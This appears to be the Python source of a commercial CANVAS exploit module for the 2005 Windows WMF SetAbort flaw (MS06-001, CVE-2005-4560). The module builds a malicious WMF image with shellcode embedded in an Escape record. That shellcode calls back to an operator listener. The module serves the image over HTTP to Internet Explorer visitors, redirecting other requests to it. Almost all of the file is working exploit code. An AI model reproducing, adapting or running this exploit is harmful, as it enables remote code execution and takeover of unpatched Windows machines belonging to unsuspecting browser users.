#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
sys.path.append(".")
sys.path.append("../../")


from exploitutils import *
from tcpexploit import tcpexploit
from httpclientside import httpclientside
import canvasengine


NAME="WMF SetAbort (MS06-001)"
DESCRIPTION="Misdesign in WMF file parser allows for shellcode execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2005-4560"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4560"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["MSRC"]="http://www.microsoft.com/technet/security/bulletin/ms06-001.mspx"


VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['MSADV']="MS06-001"
PROPERTY['DELIVERY']='HTTP'
NOTES="""
   XPSP2 77f33400 is call eax
   
"""

CHANGELOG="""

"""


def Escape(funcnum,indata):
    """returns a string for our escape structure"""
    ret=""
    ret+=intel_short(0x0026) #escape code
    #params
    ret+=intel_short(funcnum)
    ret+=intel_short(len(indata)) #InDataSize
    ret+=indata
    #size of body-header in words
    ret=intel_order(len(ret)/2+2)+ret
    return ret

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", "")]
         
        self.shellcode="\xcc" * 298
        self.setVersions()
        self.version=1
        self.badstring="" #bad strings are for wusses :>
        self.name=NAME 
        self.filename="Hello.wmf"
        self.listenerArgsDict["fromcreatethread"]=1
        return


    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows - all versions",None)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        #return self.createWin32Shellcode(self.badstring,host,port)
        return self.createWin32ThreadCallbackShellcode()
    
    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get("filename",self.filename)
        
        filedata=self.makefile()
        self.log("Opening %s for output"%self.filename)
        fd=file(self.filename,"wb+")
        fd.write(filedata)
        fd.close()
        self.log("Wrote to %s"%self.filename)
        return 1

    def makefile(self):
        """Makes the actual bad file"""
        filedata=""
        
        #start meta header
        #mtType
        filedata+=intel_short(1)
        #mtHeaderSize
        filedata+=intel_short(9) #should probably be 9+rand
        #mtVersion
        filedata+=intel_short(0x0300) #should probably be 2
        #mtSize
        filedata+=intel_order(0x00000000) #fill this in later with total size / 2
        #mtNoObjects
        filedata+=intel_short(2) #just one for now...
        #mtMaxRecord
        filedata+=intel_order(0x1ff0) #whatever
        #mtNoParameters
        filedata+=intel_short(0) #just nothing - we can fill this in I think
        #end metaheader
        self.log("Header length (should be 18) %d"%len(filedata))
        
        #body
 
        filedata2=""
        #function . I can't believe they let us call every GDI function. That's just funny.
        filedata+=Escape(9,pad4(self.shellcode))
        filedata+=Escape(1,"")
        filedata+=(intel_order(3)+intel_order(0))*4 #final records
        
        #now go back and redo size
        self.log("Total length: %x /2=%x"%(len(filedata),len(filedata)/2))
        filedata=stroverwrite(filedata,intel_order(len(filedata)/2),6)
        self.log("Header: %s"%prettyhexprint(filedata[:18]))
        return filedata
        
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        if clientheader.URL.count(".wmf"):
            #the exploit
            self.log("Sending the WMF file")
            self.createShellcode()
            self.log("Self.shellcode=%s"%prettyhexprint(self.shellcode[:16]))
            sploitstring=self.makefile()
            h.addHeader("Content-type","image/wmf")
            b.setBody(sploitstring)
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status="302"
            h.addHeader("Location","hello.wmf")
            h.addHeader("Content-Type","image/wmf")

        return h,b



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
